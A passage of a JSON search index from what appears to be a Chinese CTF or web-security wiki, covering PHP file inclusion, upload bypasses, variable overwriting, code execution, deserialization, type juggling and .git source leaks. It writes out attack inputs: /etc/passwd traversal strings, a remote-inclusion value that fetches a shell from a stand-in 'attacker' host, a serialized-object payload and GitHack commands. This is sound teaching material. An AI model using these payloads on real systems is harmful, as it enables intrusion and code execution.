\u7684\u7f29\u5199\uff0c\u4e2d\u6587\u610f\u601d\u662f\u300c\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\u300d\u3002\u4e13\u4e1a\u4e0a\u8bb2\u5c31\u662f\u4f9d\u7167\u4e00\u5b9a\u7684\u5b89\u5168\u7b56\u7565\uff0c\u901a\u8fc7\u8f6f\u3001\u786c\u4ef6\uff0c\u5bf9\u7f51\u7edc\u3001\u7cfb\u7edf\u7684\u8fd0\u884c\u72b6\u51b5\u8fdb\u884c\u76d1\u89c6\uff0c\u5c3d\u53ef\u80fd\u53d1\u73b0\u5404\u79cd\u653b\u51fb\u4f01\u56fe\u3001\u653b\u51fb\u884c\u4e3a\u6216\u8005\u653b\u51fb\u7ed3\u679c\uff0c\u4ee5\u4fdd\u8bc1\u7f51\u7edc\u7cfb\u7edf\u8d44\u6e90\u7684\u673a\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u548c\u53ef\u7528\u6027\u3002\u505a\u4e00\u4e2a\u5f62\u8c61\u7684\u6bd4\u55bb\uff1a\u5047\u5982\u9632\u706b\u5899\u662f\u4e00\u5e62\u5927\u697c\u7684\u95e8\u9501\uff0c\u90a3\u4e48 IDS \u5c31\u662f\u8fd9\u5e62\u5927\u697c\u91cc\u7684\u76d1\u89c6\u7cfb\u7edf\u3002\u4e00\u65e6\u5c0f\u5077\u722c\u7a97\u8fdb\u5165\u5927\u697c\uff0c\u6216\u5185\u90e8\u4eba\u5458\u6709\u8d8a\u754c\u884c\u4e3a\uff0c\u53ea\u6709\u5b9e\u65f6\u76d1\u89c6\u7cfb\u7edf\u624d\u80fd\u53d1\u73b0\u60c5\u51b5\u5e76\u53d1\u51fa\u8b66\u544a\u3002","title":"IDS"},{"location":"web/introduction/#ips","text":"\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\uff08IPS\uff1aIntrusion Prevention System\uff09\u662f\u7535\u8111\u7f51\u7edc\u5b89\u5168\u8bbe\u65bd\uff0c\u662f\u5bf9\u9632\u75c5\u6bd2\u8f6f\u4ef6\uff08Antivirus Programs\uff09\u548c\u9632\u706b\u5899\uff08Packet Filter\uff0cApplication Gateway\uff09\u7684\u8865\u5145\u3002\u5165\u4fb5\u9884\u9632\u7cfb\u7edf\uff08Intrusion-prevention system\uff09\u662f\u4e00\u90e8\u80fd\u591f\u76d1\u89c6\u7f51\u7edc\u6216\u7f51\u7edc\u8bbe\u5907\u7684\u7f51\u7edc\u8d44\u6599\u4f20\u8f93\u884c\u4e3a\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\uff0c\u80fd\u591f\u5373\u65f6\u7684\u4e2d\u65ad\u3001\u8c03\u6574\u6216\u9694\u79bb\u4e00\u4e9b\u4e0d\u6b63\u5e38\u6216\u662f\u5177\u6709\u4f24\u5bb3\u6027\u7684\u7f51\u7edc\u8d44\u6599\u4f20\u8f93\u884c\u4e3a\u3002","title":"IPS"},{"location":"web/introduction/#_9","text":"WEB \u6e17\u900f Wiki","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web/php/","text":"\u6587\u4ef6\u5305\u542b \u00b6 \u5e38\u89c1\u7684\u5bfc\u81f4\u6587\u4ef6\u5305\u542b\u7684\u51fd\u6570\u6709\uff1a PHP\uff1a include() \uff0c include_once() \uff0c require() \uff0c require_once() \uff0c fopen() \uff0c readfile() \u7b49 JSP Servlet\uff1a ava.io.File() \uff0c java.io.FileReader() \u7b49 ASP\uff1a includefile \uff0c includevirtual \u7b49 \u5f53 PHP \u5305\u542b\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0c\u4f1a\u5c06\u8be5\u6587\u4ef6\u5f53\u505a PHP \u4ee3\u7801\u6267\u884c\uff0c\u800c\u4e0d\u4f1a\u5728\u610f\u6587\u4ef6\u65f6\u4ec0\u4e48\u7c7b\u578b\u3002 \u672c\u5730\u6587\u4ef6\u5305\u542b \u00b6 \u672c\u5730\u6587\u4ef6\u5305\u542b\uff0cLocal File Inclusion\uff0cLFI\u3002 <?php $file = $_GET [ 'file' ]; if ( file_exists ( '/home/wwwrun/' . $file . '.php' )) { include '/home/wwwrun/' . $file . '.php' ; } ?> \u4e0a\u8ff0\u4ee3\u7801\u5b58\u5728\u672c\u5730\u6587\u4ef6\u5305\u542b\uff0c\u53ef\u7528 %00 \u622a\u65ad\u7684\u65b9\u5f0f\u8bfb\u53d6 /etc/passwd \u6587\u4ef6\u5185\u5bb9\u3002 %00 \u622a\u65ad ?file=../../../../../../../../../etc/passwd%00 \u9700\u8981 magic_quotes_gpc=off \uff0cPHP \u5c0f\u4e8e 5.3.4 \u6709\u6548\u3002 \u8def\u5f84\u957f\u5ea6\u622a\u65ad ?file=../../../../../../../../../etc/passwd/././././././.[\u2026]/./././././. Linux \u9700\u8981\u6587\u4ef6\u540d\u957f\u4e8e 4096\uff0cWindows \u9700\u8981\u957f\u4e8e 256\u3002 \u70b9\u53f7\u622a\u65ad ?file=../../../../../../../../../boot.ini/\u2026\u2026\u2026[\u2026]\u2026\u2026\u2026\u2026 \u53ea\u9002\u7528 Windows\uff0c\u70b9\u53f7\u9700\u8981\u957f\u4e8e 256\u3002 \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b \u00b6 \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\uff0cRemote File Inclusion\uff0cRFI\u3002 <?php if ( $route == \"share\" ) { require_once $basePath . \"/action/m_share.php\" ; } elseif ( $route == \"sharelink\" ) { require_once $basePath . \"/action/m_sharelink.php\" ; } \u6784\u9020\u53d8\u91cf basePath \u7684\u503c\u3002 /?basePath=http://attacker/phpshell.txt? \u6700\u7ec8\u7684\u4ee3\u7801\u6267\u884c\u4e86 require_once \"http://attacker/phpshell.txt?/action/m_share.php\"; \u95ee\u53f7\u540e\u7684\u90e8\u5206\u88ab\u89e3\u91ca\u4e3a URL \u7684 querystring\uff0c\u8fd9\u4e5f\u662f\u4e00\u79cd\u300c\u622a\u65ad\u300d\u3002 \u666e\u901a\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b ?file=[http|https|ftp]://example.com/shell.txt \u9700\u8981 allow_url_fopen=On \u5e76\u4e14 allow_url_include=On \u3002 \u5229\u7528 PHP \u6d41 input ?file=php://input \u9700\u8981 allow_url_include=On \u3002 \u5229\u7528 PHP \u6d41 filter ?file=php://filter/convert.base64-encode/resource=index.php \u9700\u8981 allow_url_include=On \u3002 \u5229\u7528 data URIs ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo= \u9700\u8981 allow_url_include=On \u3002 \u5229\u7528 XSS \u6267\u884c ?file=http://127.0.0.1/path/xss.php?xss=phpcode \u9700\u8981 allow_url_fopen=On \uff0c allow_url_include=On \u5e76\u4e14\u9632\u706b\u5899\u6216\u8005\u767d\u540d\u5355\u4e0d\u5141\u8bb8\u8bbf\u95ee\u5916\u7f51\u65f6\uff0c\u5148\u5728\u540c\u7ad9\u70b9\u627e\u4e00\u4e2a XSS \u6f0f\u6d1e\uff0c\u5305\u542b\u8fd9\u4e2a\u9875\u9762\uff0c\u5c31\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u4ee3\u7801\u4e86\u3002 \u6587\u4ef6\u4e0a\u4f20 \u00b6 \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u662f\u6307\u7528\u6237\u4e0a\u4f20\u4e86\u4e00\u4e2a\u53ef\u6267\u884c\u811a\u672c\u6587\u4ef6\uff0c\u5e76\u901a\u8fc7\u6b64\u6587\u4ef6\u83b7\u5f97\u4e86\u6267\u884c\u670d\u5668\u7aef\u547d\u4ee4\u7684\u80fd\u529b\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u4e00\u822c\u662f\u6307\u4e0a\u4f20 WEB \u811a\u672c\u80fd\u591f\u88ab\u670d\u52a1\u5668\u89e3\u6790\u7684\u95ee\u9898\uff0c\u4e5f\u5c31\u662f\u6240\u8c13\u7684 webshell \u95ee\u9898\u3002\u5b8c\u6210\u8fd9\u4e00\u653b\u51fb\u9700\u8981\u8fd9\u6837\u51e0\u4e2a\u6761\u4ef6\uff0c\u4e00\u662f\u4e0a\u4f20\u7684\u6587\u4ef6\u80fd\u591f\u8fd9 WEB \u5bb9\u5668\u6267\u884c\uff0c\u5176\u6b21\u7528\u6237\u80fd\u4ece WEB \u4e0a\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6700\u540e\uff0c\u5982\u679c\u4e0a\u4f20\u7684\u6587\u4ef6\u88ab\u5b89\u5168\u68c0\u67e5\u3001\u683c\u5f0f\u5316\u3001\u56fe\u7247\u538b\u7f29\u7b49\u529f\u80fd\u6539\u53d8\u4e86\u5185\u5bb9\uff0c\u5219\u53ef\u80fd\u5bfc\u81f4\u653b\u51fb\u5931\u8d25\u3002 \u7ed5\u8fc7\u4e0a\u4f20\u68c0\u67e5 \u00b6 \u524d\u7aef\u68c0\u67e5\u6269\u5c55\u540d \u6293\u5305\u7ed5\u8fc7\u5373\u53ef\u3002 Content-Type \u68c0\u6d4b\u6587\u4ef6\u7c7b\u578b \u6293\u5305\u4fee\u6539 Content-Type \u7c7b\u578b\uff0c\u4f7f\u5176\u7b26\u5408\u767d\u540d\u5355\u89c4\u5219\u3002 \u670d\u52a1\u7aef\u6dfb\u52a0\u540e\u7f00 \u5c1d\u8bd5 %00 \u622a\u65ad\u3002 \u670d\u52a1\u7aef\u6269\u5c55\u540d\u68c0\u6d4b \u5229\u7528\u89e3\u6790\u6f0f\u6d1e\u3002 Apache \u89e3\u6790 phpshell.php.rar.rar.rar.rar \u56e0\u4e3a Apache \u4e0d\u8ba4\u8bc6 .rar \u8fd9\u4e2a\u6587\u4ef6\u7c7b\u578b\uff0c\u6240\u4ee5\u4f1a\u4e00\u76f4\u904d\u5386\u540e\u7f00\u5230 .php \uff0c\u7136\u540e\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a PHP \u6587\u4ef6\u3002 IIS \u89e3\u6790 IIS 6 \u4e0b\u5f53\u6587\u4ef6\u540d\u4e3a abc.asp;xx.jpg \u65f6\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a abc.asp \u3002 PHP CGI \u8def\u5f84\u89e3\u6790 \u5f53\u8bbf\u95ee http://www.a.com/path/test.jpg/notexist.php \u65f6\uff0c\u4f1a\u5c06 test.jpg \u5f53\u505a PHP \u89e3\u6790\uff0c notexist.php \u662f\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u3002\u6b64\u65f6 Nginx \u7684\u914d\u7f6e\u5982\u4e0b location ~ \\.php$ { root html ; fastcgi_pass 127.0.0.1 : 9000 ; fastcgi_index index.php ; fastcgi_param SCRIPT_FILENAME /scripts $fastcgi_script_name ; include fastcgi_param ; } \u5176\u4ed6\u65b9\u5f0f \u540e\u7f00\u5927\u5c0f\u5199\u3001\u53cc\u5199\u3001\u7279\u6b8a\u540e\u7f00\u5982 php5 \u7b49\uff0c\u4fee\u6539\u5305\u5185\u5bb9\u7684\u5927\u5c0f\u5199\u8fc7 WAF \u7b49\u3002 \u53d8\u91cf\u8986\u76d6 \u00b6 \u5168\u5c40\u53d8\u91cf\u8986\u76d6 \u00b6 \u53d8\u91cf\u5982\u679c\u672a\u88ab\u521d\u59cb\u5316\uff0c\u4e14\u80fd\u591f\u7528\u6237\u6240\u63a7\u5236\uff0c\u90a3\u4e48\u5f88\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5b89\u5168\u95ee\u9898\u3002 register_globals = ON \u793a\u4f8b <?php echo \"Register_globals: \" . ( int ) ini_get ( \"register_globals\" ) . \"<br/>\" ; if ( $auth ) { echo \"private!\" ; } ?> \u5f53 register_globals=ON \u65f6\uff0c\u63d0\u4ea4 test.php?auth=1 \uff0c auth \u53d8\u91cf\u5c06\u81ea\u52a8\u5f97\u5230\u8d4b\u503c\u3002 extract() \u53d8\u91cf\u8986\u76d6 \u00b6 extract() \u51fd\u6570\u80fd\u591f\u5c06\u53d8\u91cf\u4ece\u6570\u7ec4\u5bfc\u5165\u5230\u5f53\u524d\u7684\u7b26\u53f7\u8868\uff0c\u5176\u5b9a\u4e49\u4e3a int extract ( array $var_array [, int $extract_type [, string $prefix ]] ) \u5176\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u51fd\u6570\u5c06\u53d8\u91cf\u5bfc\u5165\u7b26\u53f7\u8868\u65f6\u7684\u884c\u4e3a\uff0c\u6700\u5e38\u89c1\u7684\u4e24\u4e2a\u503c\u662f EXTR_OVERWRITE \u548c EXTR_SKIP \u3002 \u5f53\u503c\u4e3a EXTR_OVERWRITE \u65f6\uff0c\u5728\u5c06\u53d8\u91cf\u5bfc\u5165\u7b26\u53f7\u8868\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u53d8\u91cf\u540d\u53d1\u751f\u51b2\u7a81\uff0c\u5219\u8986\u76d6\u6240\u6709\u53d8\u91cf\uff1b\u503c\u4e3a EXTR_SKIP \u5219\u8868\u793a\u8df3\u8fc7\u4e0d\u8986\u76d6\u3002\u82e5\u7b2c\u4e8c\u4e2a\u53c2\u6570\u672a\u6307\u5b9a\uff0c\u5219\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f7f\u7528 EXTR_OVERWRITE \u3002 <?php $auth = \"0\" ; extract ( $_GET ); if ( $auth == 1 ) { echo \"private!\" ; } else { echo \"public!\" ; } ?> \u5f53 extract() \u51fd\u6570\u4ece\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u7684\u6570\u7ec4\u4e2d\u5bfc\u51fa\u53d8\u91cf\u65f6\uff0c\u53ef\u80fd\u53d1\u751f\u53d8\u91cf\u8986\u76d6\u3002 import_request_variables \u53d8\u91cf\u8986\u76d6 \u00b6 bool import_request_variables (string $types [, string $prefix]) import_request_variables \u5c06 GET\u3001POST\u3001Cookies \u4e2d\u7684\u53d8\u91cf\u5bfc\u5165\u5230\u5168\u5c40\uff0c\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u53ea\u7528\u7b80\u5355\u5730\u6307\u5b9a\u7c7b\u578b\u5373\u53ef\u3002 <?php $auth = \"0\" ; import_request_variables ( \"G\" ); if ( $auth == 1 ) { echo \"private!\" ; } else { echo \"public!\" ; } ?> import_request_variables(\"G\") \u6307\u5b9a\u5bfc\u5165 GET \u8bf7\u6c42\u4e2d\u7684\u53d8\u91cf\uff0c\u63d0\u4ea4 test.php?auth=1 \u51fa\u73b0\u53d8\u91cf\u8986\u76d6\u3002 parse_str() \u53d8\u91cf\u8986\u76d6 \u00b6 void parse_str ( string $str [, array &$arr ]) parse_str() \u51fd\u6570\u901a\u5e38\u7528\u4e8e\u89e3\u6790 URL \u4e2d\u7684 querystring\uff0c\u4f46\u662f\u5f53\u53c2\u6570\u503c\u53ef\u4ee5\u88ab\u7528\u6237\u63a7\u5236\u65f6\uff0c\u5f88\u53ef\u80fd\u5bfc\u81f4\u53d8\u91cf\u8986\u76d6\u3002 // var.php?var=new \u53d8\u91cf\u8986\u76d6 $var = \"init\"; parse_str($_SERVER[\"QUERY_STRING\"]); print $var; \u4e0e parse_str() \u7c7b\u4f3c\u7684\u51fd\u6570\u8fd8\u6709 mb_parse_str() \u3002 \u547d\u4ee4\u6267\u884c \u00b6 \u76f4\u63a5\u6267\u884c\u4ee3\u7801 \u00b6 PHP \u4e2d\u6709\u4e0d\u5c11\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u4ee3\u7801\u7684\u51fd\u6570\u3002 eval(); assert(); system(); exec(); shell_exec(); passthru(); escapeshellcmd(); pcntl_exec(); ...... preg_replace() \u4ee3\u7801\u6267\u884c \u00b6 preg_replace() \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5982\u679c\u5b58\u5728 /e \u6a21\u5f0f\u4fee\u9970\u7b26\uff0c\u5219\u5141\u8bb8\u4ee3\u7801\u6267\u884c\u3002 <?php $var = \"<tag>phpinfo()</tag>\" ; preg_replace ( \"/<tag>(.*?)<\\/tag>/e\" , \"addslashes( \\\\ 1)\" , $var ); ?> \u5982\u679c\u6ca1\u6709 /e \u4fee\u9970\u7b26\uff0c\u53ef\u4ee5\u5c1d\u8bd5 %00 \u622a\u65ad\u3002 \u52a8\u6001\u51fd\u6570\u6267\u884c \u00b6 \u7528\u6237\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u53ef\u4ee5\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002 <?php $dyn_func = $_GET [ \"dyn_func\" ]; $argument = $_GET [ \"argument\" ]; $dyn_func ( $argument ); ?> \u53cd\u5f15\u53f7\u547d\u4ee4\u6267\u884c \u00b6 <?php echo `ls -al` ; ?> Curly Syntax \u00b6 PHP \u7684 Curly Syntax \u4e5f\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\uff0c\u5b83\u5c06\u6267\u884c\u82b1\u62ec\u53f7\u95f4\u7684\u4ee3\u7801\uff0c\u5e76\u5c06\u7ed3\u679c\u66ff\u6362\u56de\u53bb\u3002 <?php $var = \"aaabbbccc ${ `ls` } \" ; ?> <?php $foobar = \"phpinfo\" ; $ { \"foobar\" }(); ?> \u56de\u8c03\u51fd\u6570 \u00b6 \u5f88\u591a\u51fd\u6570\u90fd\u53ef\u4ee5\u6267\u884c\u56de\u8c03\u51fd\u6570\uff0c\u5f53\u56de\u8c03\u51fd\u6570\u7528\u6237\u53ef\u63a7\u65f6\uff0c\u5c06\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002 <?php $evil_callback = $_GET [ \"callback\" ]; $some_array = array ( 0 , 1 , 2 , 3 ); $new_array = array_map ( $evil_callback , $some_array ); ?> \u653b\u51fb payload http://www.a.com/index.php?callback=phpinfo \u53cd\u5e8f\u5217\u5316 \u00b6 \u5982\u679c unserialize() \u5728\u6267\u884c\u65f6\u5b9a\u4e49\u4e86 __destruct() \u6216 __wakeup() \u51fd\u6570\uff0c\u5219\u6709\u53ef\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002 <?php class Example { var $var = \"\" ; function __destruct () { eval ( $this -> $var ); } } unserialize ( $_GET [ \"saved_code\" ]); ?> \u653b\u51fb payload http://www.a.com/index.php?saved_code=O:7:\"Example\":1:{s:3:\"var\";s:10:\"phpinfo();\";} PHP \u7279\u6027 \u00b6 \u6570\u7ec4 \u00b6 <?php $var = 1 ; $var = array (); $var = \"string\" ; ?> php \u4e0d\u4f1a\u4e25\u683c\u68c0\u9a8c\u4f20\u5165\u7684\u53d8\u91cf\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u5c06\u53d8\u91cf\u81ea\u7531\u7684\u8f6c\u6362\u7c7b\u578b\u3002 \u6bd4\u5982\u5728 $a == $b \u7684\u6bd4\u8f83\u4e2d $a = null; $b = false; //\u4e3a\u771f $a = ''; $b = 0; //\u540c\u6837\u4e3a\u771f \u7136\u800c\uff0cPHP \u5185\u6838\u7684\u5f00\u53d1\u8005\u539f\u672c\u662f\u60f3\u8ba9\u7a0b\u5e8f\u5458\u501f\u7531\u8fd9\u79cd\u4e0d\u9700\u8981\u58f0\u660e\u7684\u4f53\u7cfb\uff0c\u66f4\u52a0\u9ad8\u6548\u7684\u5f00\u53d1\uff0c\u6240\u4ee5\u5728\u51e0\u4e4e\u6240\u6709\u5185\u7f6e\u51fd\u6570\u4ee5\u53ca\u57fa\u672c\u7ed3\u6784\u4e2d\u4f7f\u7528\u4e86\u5f88\u591a\u677e\u6563\u7684\u6bd4\u8f83\u548c\u8f6c\u6362\uff0c\u9632\u6b62\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cf\u56e0\u4e3a\u7a0b\u5e8f\u5458\u7684\u4e0d\u89c4\u8303\u800c\u9891\u7e41\u7684\u62a5\u9519\uff0c\u7136\u800c\u8fd9\u5374\u5e26\u6765\u4e86\u5b89\u5168\u95ee\u9898\u3002 0=='0' //true 0 == 'abcdefg' //true 0 === 'abcdefg' //false 1 == '1abcdef' //true \u9b54\u6cd5 Hash \u00b6 \"0e132456789\"==\"0e7124511451155\" //true \"0e123456abc\"==\"0e1dddada\" //false \"0e1abc\"==\"0\" //true \u5728\u8fdb\u884c\u6bd4\u8f83\u8fd0\u7b97\u65f6\uff0c\u5982\u679c\u9047\u5230\u4e86 0e\\d+ \u8fd9\u79cd\u5b57\u7b26\u4e32\uff0c\u5c31\u4f1a\u5c06\u8fd9\u79cd\u5b57\u7b26\u4e32\u89e3\u6790\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\u3002\u6240\u4ee5\u4e0a\u9762\u4f8b\u5b50\u4e2d 2 \u4e2a\u6570\u7684\u503c\u90fd\u662f 0 \u56e0\u800c\u5c31\u76f8\u7b49\u4e86\u3002\u5982\u679c\u4e0d\u6ee1\u8db3 0e\\d+ \u8fd9\u79cd\u6a21\u5f0f\u5c31\u4e0d\u4f1a\u76f8\u7b49\u3002 \u5341\u516d\u8fdb\u5236\u8f6c\u6362 \u00b6 \"0x1e240\"==\"123456\" //true \"0x1e240\"==123456 //true \"0x1e240\"==\"1e240\" //false \u5f53\u5176\u4e2d\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f 0x \u5f00\u5934\u7684\u65f6\u5019\uff0cPHP \u4f1a\u5c06\u6b64\u5b57\u7b26\u4e32\u89e3\u6790\u6210\u4e3a\u5341\u8fdb\u5236\u7136\u540e\u518d\u8fdb\u884c\u6bd4\u8f83\uff0c 0x1240 \u89e3\u6790\u6210\u4e3a\u5341\u8fdb\u5236\u5c31\u662f 123456\uff0c\u6240\u4ee5\u4e0e int \u7c7b\u578b\u548c string \u7c7b\u578b\u7684 123456 \u6bd4\u8f83\u90fd\u662f\u76f8\u7b49\u3002 \u7c7b\u578b\u8f6c\u6362 \u00b6 \u5e38\u89c1\u7684\u8f6c\u6362\u4e3b\u8981\u5c31\u662f int \u8f6c\u6362\u4e3a string \uff0c string \u8f6c\u6362\u4e3a int \u3002 int \u8f6c string $var = 5; \u65b9\u5f0f1\uff1a$item = (string)$var; \u65b9\u5f0f2\uff1a$item = strval($var); string \u8f6c int \uff1a intval() \u51fd\u6570\u3002 \u5bf9\u4e8e\u8fd9\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u5148\u770b 2 \u4e2a\u4f8b\u5b50\u3002 var_dump(intval('2')) //2 var_dump(intval('3abcd')) //3 var_dump(intval('abcd')) //0 \u8bf4\u660e intval() \u8f6c\u6362\u7684\u65f6\u5019\uff0c\u4f1a\u5c06\u4ece\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\u77e5\u9053\u9047\u5230\u4e00\u4e2a\u975e\u6570\u5b57\u7684\u5b57\u7b26\u3002\u5373\u4f7f\u51fa\u73b0\u65e0\u6cd5\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\uff0c intval() \u4e0d\u4f1a\u62a5\u9519\u800c\u662f\u8fd4\u56de 0\u3002 \u540c\u65f6\uff0c\u7a0b\u5e8f\u5458\u5728\u7f16\u7a0b\u7684\u65f6\u5019\u4e5f\u4e0d\u5e94\u8be5\u4f7f\u7528\u5982\u4e0b\u7684\u8fd9\u6bb5\u4ee3\u7801\uff1a if(intval($a)>1000) { mysql_query(\"select * from news where id=\".$a) } \u8fd9\u4e2a\u65f6\u5019 $a \u7684\u503c\u6709\u53ef\u80fd\u662f 1002 union \u3002 \u5185\u7f6e\u51fd\u6570\u7684\u53c2\u6570\u7684\u677e\u6563\u6027 \u00b6 \u5185\u7f6e\u51fd\u6570\u7684\u677e\u6563\u6027\u8bf4\u7684\u662f\uff0c\u8c03\u7528\u51fd\u6570\u65f6\u7ed9\u51fd\u6570\u4f20\u9012\u51fd\u6570\u65e0\u6cd5\u63a5\u53d7\u7684\u53c2\u6570\u7c7b\u578b\u3002\u89e3\u91ca\u8d77\u6765\u6709\u70b9\u62d7\u53e3\uff0c\u8fd8\u662f\u76f4\u63a5\u901a\u8fc7\u5b9e\u9645\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u95ee\u9898\uff0c\u4e0b\u9762\u4f1a\u91cd\u70b9\u4ecb\u7ecd\u51e0\u4e2a\u8fd9\u79cd\u51fd\u6570\u3002 md5() $array1[] = array( \"foo\" => \"bar\", \"bar\" => \"foo\", ); $array2 = array(\"foo\", \"bar\", \"hello\", \"world\"); var_dump(md5($array1)==var_dump($array2)); //true PHP \u624b\u518c\u4e2d\u7684 md5\uff08\uff09\u51fd\u6570\u7684\u63cf\u8ff0\u662f string md5 ( string $str [, bool $raw_output = false ] ) \uff0c md5() \u4e2d\u7684\u9700\u8981\u662f\u4e00\u4e2a string \u7c7b\u578b\u7684\u53c2\u6570\u3002\u4f46\u662f\u5f53\u4f60\u4f20\u9012\u4e00\u4e2a array \u65f6\uff0c md5() \u4e0d\u4f1a\u62a5\u9519\uff0c\u53ea\u662f\u4f1a\u65e0\u6cd5\u6b63\u786e\u5730\u6c42\u51fa array \u7684 md5 \u503c\uff0c\u8fd9\u6837\u5c31\u4f1a\u5bfc\u81f4\u4efb\u610f 2 \u4e2a array \u7684 md5 \u503c\u90fd\u4f1a\u76f8\u7b49\u3002 strcmp() strcmp() \u51fd\u6570\u5728 PHP \u5b98\u65b9\u624b\u518c\u4e2d\u7684\u63cf\u8ff0\u662f intstrcmp ( string $str1 \uff0c string $str2 ) \uff0c\u9700\u8981\u7ed9 strcmp() \u4f20\u9012 2 \u4e2a string \u7c7b\u578b\u7684\u53c2\u6570\u3002\u5982\u679c str1 \u5c0f\u4e8e str2 \uff0c\u8fd4\u56de -1\uff0c\u76f8\u7b49\u8fd4\u56de 0\uff0c\u5426\u5219\u8fd4\u56de 1\u3002 strcmp() \u51fd\u6570\u6bd4\u8f83\u5b57\u7b26\u4e32\u7684\u672c\u8d28\u662f\u5c06\u4e24\u4e2a\u53d8\u91cf\u8f6c\u6362\u4e3a ASCII\uff0c\u7136\u540e\u8fdb\u884c\u51cf\u6cd5\u8fd0\u7b97\uff0c\u7136\u540e\u6839\u636e\u8fd0\u7b97\u7ed3\u679c\u6765\u51b3\u5b9a\u8fd4\u56de\u503c\u3002 \u5982\u679c\u4f20\u5165\u7ed9\u51fa strcmp() \u7684\u53c2\u6570\u662f\u6570\u5b57\u5462\uff1f $array=[1,2,3]; var_dump(strcmp($array,'123')); //null,\u5728\u67d0\u79cd\u610f\u4e49\u4e0anull\u4e5f\u5c31\u662f\u76f8\u5f53\u4e8efalse\u3002 switch() \u5982\u679c switch() \u662f\u6570\u5b57\u7c7b\u578b\u7684 case \u7684\u5224\u65ad\u65f6\uff0cswitch \u4f1a\u5c06\u5176\u4e2d\u7684\u53c2\u6570\u8f6c\u6362\u4e3a int \u7c7b\u578b\u3002\u5982\u4e0b\uff1a $i =\"2abc\"; switch ($i) { case 0: case 1: case 2: echo \"i is less than 3 but not negative\"; break; case 3: echo \"i is 3\"; } \u8fd9\u4e2a\u65f6\u5019\u7a0b\u5e8f\u8f93\u51fa\u7684\u662f i is less than 3 but not negative \uff0c\u662f\u7531\u4e8e switch() \u51fd\u6570\u5c06 $i \u8fdb\u884c\u4e86\u7c7b\u578b\u8f6c\u6362\uff0c\u8f6c\u6362\u7ed3\u679c\u4e3a 2\u3002 in_array() \u5728 PHP \u624b\u518c\u4e2d\uff0c in_array() \u51fd\u6570\u7684\u89e3\u91ca\u662f bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) ,\u5982\u679cstrict\u53c2\u6570\u6ca1\u6709\u63d0\u4f9b\uff0c\u90a3\u4e48in_array\u5c31\u4f1a\u4f7f\u7528\u677e\u6563\u6bd4\u8f83\u6765\u5224\u65ad $needle \u662f\u5426\u5728 $haystack \u4e2d\u3002\u5f53 strince \u7684\u503c\u4e3a true \u65f6\uff0c in_array() \u4f1a\u6bd4\u8f83 needls \u7684\u7c7b\u578b\u548c haystack \u4e2d\u7684\u7c7b\u578b\u662f\u5426\u76f8\u540c\u3002 $array=[0,1,2,'3']; var_dump(in_array('abc', $array)); //true var_dump(in_array('1bc', $array)); //true \u53ef\u4ee5\u770b\u5230\u4e0a\u9762\u7684\u60c5\u51b5\u8fd4\u56de\u7684\u90fd\u662f true\uff0c\u56e0\u4e3a 'abc' \u4f1a\u8f6c\u6362\u4e3a 0\uff0c '1bc' \u8f6c\u6362\u4e3a 1\u3002 array_search() \u4e0e in_array() \u4e5f\u662f\u4e00\u6837\u7684\u95ee\u9898\u3002 \u5bfb\u627e\u6e90\u4ee3\u7801\u5907\u4efd \u00b6 hg \u6e90\u7801\u6cc4\u9732 \u00b6 hg init \u65f6\u4f1a\u4ea7\u751f .hg \u6587\u4ef6\u3002 \u5229\u7528\u5de5\u5177 dvcs-ripper Git \u6e90\u7801\u6cc4\u9732 \u00b6 .git \u76ee\u5f55\u5185\u6709\u4ee3\u7801\u7684\u53d8\u66f4\u8bb0\u5f55\u7b49\u6587\u4ef6\uff0c\u5982\u679c\u90e8\u7f72\u65f6\u8be5\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u53ef\u88ab\u8bbf\u95ee\uff0c\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u6765\u6062\u590d\u6e90\u4ee3\u7801\u3002 /.git /.git/HEAD /.git/index /.git/config /.git/description GitHack python GitHack.py http://www.openssl.org/.git/ GitHacker\uff08\u53ef\u6062\u590d\u5b8c\u6574 Git \u4ed3\u5e93\uff09 python GitHacker.py http://www.openssl.org/.git/ .DS_Store \u6587\u4ef6\u6cc4\u9732 \u00b6 Mac OS \u4e2d\u4f1a\u5305\u542b\u6709 